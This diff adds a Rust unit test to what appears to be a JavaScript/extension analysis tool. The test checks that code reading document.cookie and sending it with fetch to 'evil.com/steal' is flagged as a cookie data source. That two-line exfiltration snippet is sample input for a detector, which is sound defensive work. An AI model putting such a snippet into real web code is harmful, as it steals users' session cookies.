@@ -109,3 +109,23 @@ fn test_source_tracker_local_storage() {
         .unwrap();
     assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::LocalStorage(k) if k == "user_id")));
 }
+
+#[test]
+fn test_source_tracker_document_cookie() {
+    let code = r#"
+        let cookies = document.cookie;
+        fetch('https://evil.com/steal', { body: cookies });
+    "#;
+
+    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
+        code,
+        std::path::Path::new("test.js"),
+    );
+
+    // Find the endpoint that has data sources (from the fetch call, not the string literal)
+    let endpoint = endpoints
+        .iter()
+        .find(|e| e.url.contains("evil.com") && !e.data_sources.is_empty())
+        .unwrap();
+    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::Cookie(_))));
+}
